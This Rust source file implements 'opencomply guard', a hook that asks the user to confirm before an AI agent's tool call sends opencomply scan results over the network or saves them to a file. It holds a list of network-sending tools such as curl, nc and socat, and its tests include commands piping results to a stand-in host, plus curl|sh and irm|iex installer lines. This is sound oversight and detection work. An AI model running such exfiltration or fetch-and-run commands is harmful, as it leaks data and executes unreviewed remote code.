//! `opencomply guard`: the agent plugin's pre-tool hook. Reads the hook event (JSON on stdin) and, when an AI agent's
//! tool call would send opencomply scan results off the computer or save them to a file, asks the user to confirm.
//! Everything else gets no output, so the agent's normal permission flow applies. Never runs or changes anything;
//! bounded input; any problem (bad JSON, unknown tool) means no decision — the hook must never get in the user's way.
//!
//! Agent-neutral core: an agent's event becomes a `ToolCall`, `decide` judges it, and the agent's adapter writes the
//! answer in that agent's hook format. Adding an agent = one `Agent` variant with its parse / answer functions, added
//! only once that agent's hook format has been tested for real.

/// Hook events larger than this are read only up to it.
pub const MAX_EVENT_BYTES: u64 = 1024 * 1024;

/// Agents whose hook format is supported (tested end to end).
#[derive(Debug, Clone, Copy, PartialEq, Eq, clap::ValueEnum)]
pub enum Agent {
    Claude,
}

/// What a tool call does, in agent-neutral terms.
#[derive(Debug, PartialEq, Eq)]
pub enum ToolCall {
    Shell(String),
    WriteFile { path: String, content: String },
    Other,
}

/// The hook's stdout for `event` from `agent`, or `None` to stay silent.
pub fn run(agent: Agent, event: &str) -> Option<String> {
    match agent {
        Agent::Claude => claude::parse(event)
            .and_then(|call| decide(&call))
            .map(|r| claude::ask(&r)),
    }
}

/// Why the user should confirm this call, or `None`.
pub fn decide(call: &ToolCall) -> Option<String> {
    match call {
        ToolCall::Shell(cmd) => shell_reason(cmd),
        ToolCall::WriteFile { path, content } => file_reason(content, path),
        ToolCall::Other => None,
    }
}

/// Claude Code: `PreToolUse` event in, `permissionDecision: "ask"` out.
mod claude {
    use super::{carries_results, ToolCall};
    use serde_json::Value;

    pub fn parse(event: &str) -> Option<ToolCall> {
        let Ok(v) = serde_json::from_str::<Value>(event) else {
            return cut_off_write(event);
        };
        let tool = v.get("tool_name")?.as_str()?;
        let input = v.get("tool_input")?;
        let text = |k: &str| {
            input
                .get(k)
                .and_then(Value::as_str)
                .unwrap_or("")
                .to_string()
        };
        Some(match tool {
            "Bash" | "PowerShell" => ToolCall::Shell(text("command")),
            "Write" => ToolCall::WriteFile {
                path: text("file_path"),
                content: text("content"),
            },
            "Edit" => ToolCall::WriteFile {
                path: text("file_path"),
                content: text("new_string"),
            },
            "MultiEdit" => ToolCall::WriteFile {
                path: text("file_path"),
                content: input
                    .get("edits")
                    .and_then(Value::as_array)
                    .map(|edits| {
                        edits
                            .iter()
                            .filter_map(|e| e.get("new_string").and_then(Value::as_str))
                            .collect::<Vec<_>>()
                            .join("\n")
                    })
                    .unwrap_or_default(),
            },
            _ => ToolCall::Other,
        })
    }

    /// An event cut at `MAX_EVENT_BYTES` is not valid JSON; a file write of scan results is still recognised.
    fn cut_off_write(event: &str) -> Option<ToolCall> {
        let writes = [
            "\"tool_name\":\"Write\"",
            "\"tool_name\":\"Edit\"",
            "\"tool_name\":\"MultiEdit\"",
        ]
        .iter()
        .any(|t| event.contains(t));
        let content = event.replace("\\n", "\n").replace("\\\"", "\"");
        (writes && carries_results(&content)).then_some(ToolCall::WriteFile {
            path: String::new(),
            content,
        })
    }

    pub fn ask(reason: &str) -> String {
        serde_json::json!({
            "hookSpecificOutput": {
                "hookEventName": "PreToolUse",
                "permissionDecision": "ask",
                "permissionDecisionReason": reason,
            }
        })
        .to_string()
    }
}

const NETWORK: &[&str] = &[
    "curl",
    "wget",
    "invoke-restmethod",
    "invoke-webrequest",
    "irm",
    "iwr",
    "send-mailmessage",
    "nc",
    "ncat",
    "netcat",
    "socat",
    "scp",
    "sftp",
    "ftp",
    "telnet",
    "net.webclient",
    "httpclient",
    "requests.post",
    "requests.put",
    "urllib",
    "fetch(",
];
const FILE_CMDLETS: &[&str] = &[
    "tee-object",
    "out-file",
    "set-content",
    "add-content",
    "export-csv",
    "tee",
    "set-clipboard",
];

fn shell_reason(cmd: &str) -> Option<String> {
    let lower = cmd.to_ascii_lowercase();
    let runs_scan = lower.contains("opencomply") && lower.contains(" scan ");
    if !(runs_scan || carries_results(cmd)) {
        return None;
    }
    if let Some(at) = network_at(&lower) {
        let dest = first_url(&cmd[at..]).map_or_else(String::new, |u| format!(" ({})", clean(u)));
        return Some(format!(
            "OpenComply: this sends scan results off this computer{dest}. Allow it only if you asked to send them there."
        ));
    }
    if let Some(target) = file_target(cmd) {
        let place = if target.is_empty() {
            "a file".to_string()
        } else {
            clean(&target)
        };
        return Some(format!(
            "OpenComply: this saves scan results to {place}. Allow it only if you chose this place."
        ));
    }
    None
}

fn file_reason(content: &str, path: &str) -> Option<String> {
    carries_results(content).then(|| {
        let place = if path.is_empty() { "a file".to_string() } else { clean(path) };
        format!("OpenComply: this saves scan results to {place}. Allow it only if you chose this place.")
    })
}

/// Text that is (part of) an opencomply report of any module: the summary's first line (`<module> <target> verdict=`),
/// the Markdown title, the JSON report keys, or several rule IDs such as `HDR-001` / `TLS-001` (a summary the agent wrote).
fn carries_results(text: &str) -> bool {
    let summary_line = text.lines().any(|l| {
        let l = l.trim_start();
        let module = l.split(' ').next().unwrap_or("");
        !module.is_empty()
            && module
                .bytes()
                .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit())
            && l.contains(" verdict=")
    });
    let rule_ids = text
        .split(|c: char| !(c.is_ascii_alphanumeric() || c == '-'))
        .filter(|w| {
            w.rsplit_once('-').is_some_and(|(p, n)| {
                (2..=6).contains(&p.len())
                    && p.starts_with(|c: char| c.is_ascii_uppercase())
                    && p.bytes()
                        .all(|b| b.is_ascii_uppercase() || b.is_ascii_digit())
                    && n.len() == 3
                    && n.bytes().all(|b| b.is_ascii_digit())
            })
        })
        .count();
    summary_line
        || text.contains("# OpenComply report")
        || (text.contains("\"scanner_version\"") && text.contains("\"findings\""))
        || rule_ids >= 3
}

/// Byte position of the first network-sending command word in `lower` (lowercased), if any.
fn network_at(lower: &str) -> Option<usize> {
    NETWORK
        .iter()
        .filter_map(|w| {
            lower.match_indices(w).find_map(|(i, _)| {
                let before = lower[..i].chars().next_back();
                let after = lower[i + w.len()..].chars().next();
                let boundary = |c: Option<char>| {
                    c.is_none_or(|c| !(c.is_ascii_alphanumeric() || c == '_' || c == '-'))
                };
                (boundary(before) && (w.ends_with('(') || boundary(after))).then_some(i)
            })
        })
        .min()
}

/// Where a shell command writes its output: a file cmdlet (`Out-File x`, `tee x`) or a `>` / `>>` redirect that is
/// not stderr (`2>`), a stream merge (`>&1`) or a discard (`$null`, `/dev/null`, `nul`). `Some("")` = a file, name unknown.
fn file_target(cmd: &str) -> Option<String> {
    let lower = cmd.to_ascii_lowercase();
    for w in FILE_CMDLETS {
        for (i, _) in lower.match_indices(w) {
            let before = lower[..i].chars().next_back();
            let after = lower[i + w.len()..].chars().next();
            if before.is_none_or(|c| !(c.is_ascii_alphanumeric() || c == '-'))
                && after.is_none_or(char::is_whitespace)
            {
                let rest = cmd[i + w.len()..].trim_start();
                let rest = rest
                    .strip_prefix("-FilePath")
                    .or_else(|| rest.strip_prefix("-Path"))
                    .unwrap_or(rest)
                    .trim_start();
                return Some(first_word(rest));
            }
        }
    }
    let bytes = cmd.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'>' {
            let prev = if i == 0 { b' ' } else { bytes[i - 1] };
            let mut j = i + 1;
            if bytes.get(j) == Some(&b'>') {
                j += 1;
            }
            let target = cmd[j..].trim_start();
            let skip = prev.is_ascii_digit()
                || prev == b'&'
                || prev == b'-'
                || prev == b'='
                || target.starts_with('&')
                || ["$null", "/dev/null", "nul"]
                    .iter()
                    .any(|n| target.to_ascii_lowercase().starts_with(n));
            if !skip {
                return Some(first_word(target));
            }
            i = j;
        } else {
            i += 1;
        }
    }
    None
}

fn first_word(s: &str) -> String {
    let s = s.trim_start_matches(['"', '\'']);
    s.split(|c: char| c.is_whitespace() || matches!(c, '"' | '\'' | ';' | '|' | '&'))
        .next()
        .unwrap_or("")
        .to_string()
}

fn first_url(s: &str) -> Option<&str> {
    let at = s.find("http://").or_else(|| s.find("https://"))?;
    s[at..]
        .split(|c: char| c.is_whitespace() || matches!(c, '"' | '\'' | ';' | '|' | ')'))
        .next()
}

/// Paths and URLs come from the agent's tool call: shown in the prompt, so no control characters and a sane length.
fn clean(s: &str) -> String {
    let s: String = s
        .chars()
        .map(|c| if c.is_control() { ' ' } else { c })
        .take(160)
        .collect();
    s.trim().to_string()
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::Value;

    /// Claude Code hook events → the hook's stdout reason (`None` = silent).
    fn reason(event: &serde_json::Value) -> Option<String> {
        run(Agent::Claude, &event.to_string()).map(|out| {
            let v: Value = serde_json::from_str(&out).unwrap();
            v["hookSpecificOutput"]["permissionDecisionReason"]
                .as_str()
                .unwrap()
                .to_string()
        })
    }

    fn shell(tool: &str, cmd: &str) -> Option<String> {
        reason(&serde_json::json!({"tool_name": tool, "tool_input": {"command": cmd}}))
    }

    fn write(content: &str) -> Option<String> {
        reason(
            &serde_json::json!({"tool_name": "Write", "tool_input": {"file_path": "C:\\r\\scan.md", "content": content}}),
        )
    }

    fn decide_raw(event: &str) -> Option<String> {
        run(Agent::Claude, event)
    }

    /// Commands that send scan output off the computer: every common way an agent would do it, on both shells.
    #[test]
    fn sending_scan_results_asks() {
        for cmd in [
            "opencomply scan headers http://x/ --format json | curl -X POST https://hook.example/in --data-binary @-",
            "$j = opencomply scan headers http://x/ --format json; Invoke-RestMethod -Method Post -Uri https://hook.example/in -Body $j",
            "opencomply scan headers http://x/ --format json | irm -Method Post https://hook.example/in",
            "opencomply scan headers http://x/ | nc hook.example 80",
            "& \"$env:LOCALAPPDATA\\opencomply\\bin\\opencomply.exe\" scan headers http://x/ | iwr -Method Post -Uri https://hook.example/in -Body {$_}",
            "wget --post-data \"$(opencomply scan headers http://x/)\" https://hook.example/in",
        ] {
            let r = shell("PowerShell", cmd).unwrap_or_default();
            assert!(r.contains("sends scan results off this computer"), "{cmd}");
        }
        assert!(shell(
            "Bash",
            "opencomply scan headers http://x/ | curl -d @- https://hook.example/in"
        )
        .unwrap()
        .contains("(https://hook.example/in)"));
    }

    #[test]
    fn saving_scan_results_asks_with_the_place() {
        for (cmd, place) in [
            ("opencomply scan headers http://x/ --format markdown > report.md", "report.md"),
            ("opencomply scan headers http://x/ >> \"C:\\r\\out.json\"", "C:\\r\\out.json"),
            ("opencomply scan headers http://x/ --format markdown | Tee-Object -FilePath .\\scan.md", ".\\scan.md"),
            ("opencomply scan headers http://x/ | Out-File scan.txt", "scan.txt"),
            ("opencomply scan headers http://x/ | tee scan.txt", "scan.txt"),
        ] {
            let r = shell("PowerShell", cmd).unwrap_or_default();
            assert!(r.contains(&format!("saves scan results to {place}.")), "{cmd} → {r}");
        }
        assert!(write("# OpenComply report — headers\n| Target | x |")
            .unwrap()
            .contains("C:\\r\\scan.md"));
        assert!(write("{\"scanner_version\":\"0.3.1\",\"findings\":[]}").is_some());
        assert!(write("headers https://x/ verdict=fail grade=F score=8 pass=1").is_some());
        assert!(write("Fix HDR-001, HDR-002 and HDR-007 first.").is_some());
        assert!(
            write("tls https://x/ verdict=fail grade=C").is_some(),
            "any module's summary line"
        );
        assert!(
            write("Do TLS-001, TLS-004 and ISO27-012 next.").is_some(),
            "any module's rule IDs"
        );
        assert_eq!(
            write("Use UTF-8, ISO-8601 dates and SHA-256."),
            None,
            "codes that are not rule IDs"
        );
        assert!(
            shell(
                "Bash",
                "opencomply scan tls https://x/ | curl -d @- https://h.example/"
            )
            .is_some(),
            "any scan module"
        );
    }

    /// The hook must stay silent on everything else — the user's own work, plain scans, discarded output.
    #[test]
    fn everything_else_stays_silent() {
        for cmd in [
            "opencomply scan headers https://example.com/ --format json",
            "opencomply scan headers http://x/ --allow-private --format markdown; \"EXIT=$LASTEXITCODE\"",
            "opencomply scan headers http://x/ 2>&1",
            "opencomply scan headers http://x/ 2>$null",
            "opencomply scan headers http://x/ > $null",
            "opencomply scan headers http://x/ > /dev/null",
            "opencomply --version",
            "curl -fsSL https://github.com/vampirebeam/OpenComply/releases/latest/download/install.sh | sh",
            "irm https://github.com/vampirebeam/OpenComply/releases/latest/download/install.ps1 | iex",
            "cargo build > build.log",
            "git status",
            "if ($a -gt 1) { 'x' }",
        ] {
            assert_eq!(shell("PowerShell", cmd), None, "{cmd}");
            assert_eq!(shell("Bash", cmd), None, "{cmd}");
        }
        assert_eq!(write("fn main() {}\n"), None);
        assert_eq!(write("This page talks about HDR-001 once."), None);
        assert_eq!(
            decide_raw("{\"tool_name\":\"Read\",\"tool_input\":{\"file_path\":\"x\"}}"),
            None
        );
        assert_eq!(decide_raw("not json"), None);
        assert_eq!(decide_raw(""), None);
    }

    #[test]
    fn prompt_text_is_clean_and_bounded() {
        let long = format!(
            "opencomply scan headers http://x/ > {}\u{1b}[2J",
            "a".repeat(400)
        );
        let out = decide_raw(
            &serde_json::json!({"tool_name": "Bash", "tool_input": {"command": long}}).to_string(),
        )
        .unwrap();
        let v: Value = serde_json::from_str(&out).unwrap();
        assert_eq!(v["hookSpecificOutput"]["permissionDecision"], "ask");
        assert_eq!(v["hookSpecificOutput"]["hookEventName"], "PreToolUse");
        let r = v["hookSpecificOutput"]["permissionDecisionReason"]
            .as_str()
            .unwrap();
        assert!(r.chars().all(|c| !c.is_control()));
        assert!(r.chars().count() < 300);
    }

    #[test]
    fn a_cut_off_event_still_catches_a_report_write() {
        let event = format!(
            "{{\"tool_name\":\"Write\",\"tool_input\":{{\"file_path\":\"r.md\",\"content\":\"# OpenComply report — headers\\n{}",
            "x".repeat(50)
        );
        assert!(decide_raw(&event).is_some());
    }

    /// The agent-neutral core works without any agent's JSON.
    #[test]
    fn core_decides_on_neutral_tool_calls() {
        assert!(decide(&ToolCall::Shell(
            "opencomply scan headers http://x/ | curl -d @- https://h.example/".into()
        ))
        .is_some());
        assert!(decide(&ToolCall::WriteFile {
            path: "a.md".into(),
            content: "# OpenComply report — headers".into()
        })
        .is_some());
        assert_eq!(decide(&ToolCall::Other), None);
    }
}
